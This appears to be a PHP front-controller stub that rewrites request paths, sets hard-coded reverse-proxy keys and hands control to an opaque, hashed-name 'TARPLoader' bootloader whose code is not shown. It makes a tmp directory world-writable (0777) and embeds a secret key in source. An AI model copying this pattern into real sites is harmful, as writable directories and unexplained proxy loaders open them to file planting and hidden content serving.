<?php
// --- loop guards & sane defaults ---
if (isset($_GET['p']) && stripos($_GET['p'], 'index.php') !== false) {
    unset($_GET['p']); // never allow index.php inside p
}

// Ensure /tmp exists & is writable (extra safety)
$dir = __DIR__ . '/tmp';
if (!is_dir($dir)) { @mkdir($dir, 0777, true); }
@chmod($dir, 0777);

// Normalize a clean path the loader can use without redirects
$path = isset($_GET['p']) && $_GET['p'] !== ''
    ? $_GET['p']
    : parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

$path = '/' . ltrim($path, '/');
if ($path === '/index.php') { $path = '/'; }

// Present a stable path to the loader (some loaders read these)
$_SERVER['REQUEST_URI'] = $path;
$_SERVER['PATH_INFO']   = $path;

// Reverse-proxy keys
$GLOBALS['_ta_rp_key'] = 'a55b83cff99869f511c919de320141e4';
$GLOBALS['_ta_reverse_proxy_id'] = '04c8dn';

// Boot & run ONCE (you had this block duplicated)
require __DIR__ . '/bootloader_218fc78d91335bef8bd0b3f91ce806e3.php';
$tarp = new TARPLoader([]);
$tarp->excute();
